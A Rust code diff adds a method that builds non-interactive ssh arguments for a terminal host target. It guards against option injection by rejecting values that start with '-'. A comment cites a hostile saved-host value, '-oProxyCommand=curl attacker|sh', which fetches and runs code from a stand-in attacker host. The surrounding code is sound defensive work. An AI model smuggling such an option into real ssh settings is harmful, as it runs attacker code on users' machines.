@@ -56,6 +56,49 @@ pub struct TerminalTarget {
 }
 
 impl TerminalTarget {
+    /// Build non-interactive ssh args that run `remote_cmd` once and exit —
+    /// no -tt (binary-safe stdin), no tmux wrapping. Honors alias/user/host/
+    /// port/identity/proxy_jump exactly like the interactive variant so uploads
+    /// reach the same host the terminal tab is connected to.
+    pub fn to_exec_args(&self, remote_cmd: &str) -> Result<Vec<String>, String> {
+        fn reject_option_like(name: &str, v: &str) -> Result<(), String> {
+            if v.starts_with('-') {
+                return Err(format!("{} must not start with '-' (got {:?})", name, v));
+            }
+            Ok(())
+        }
+
+        let mut args: Vec<String> = Vec::new();
+        args.push("-o".into()); args.push("BatchMode=yes".into());
+        args.push("-o".into()); args.push("ConnectTimeout=10".into());
+        args.push("-o".into()); args.push("ServerAliveInterval=30".into());
+
+        if let Some(port) = self.port { args.push("-p".into()); args.push(port.to_string()); }
+        if let Some(id) = &self.identity {
+            reject_option_like("identity", id)?;
+            args.push("-i".into()); args.push(id.clone());
+        }
+        if let Some(jump) = &self.proxy_jump {
+            reject_option_like("proxy_jump", jump)?;
+            args.push("-J".into()); args.push(jump.clone());
+        }
+
+        let destination = if let Some(alias) = &self.alias {
+            reject_option_like("alias", alias)?;
+            alias.clone()
+        } else {
+            let user = self.user.as_deref().ok_or("user or alias required")?;
+            let host = self.host.as_deref().ok_or("host or alias required")?;
+            reject_option_like("user", user)?;
+            reject_option_like("host", host)?;
+            format!("{}@{}", user, host)
+        };
+        args.push("--".into());
+        args.push(destination);
+        args.push(remote_cmd.to_string());
+        Ok(args)
+    }
+
     fn to_ssh_args(&self) -> Result<(Vec<String>, String), String> {
         // Reject caller-controlled values that could slide past as ssh options.
         // A saved host of "-oProxyCommand=curl attacker|sh" would otherwise be
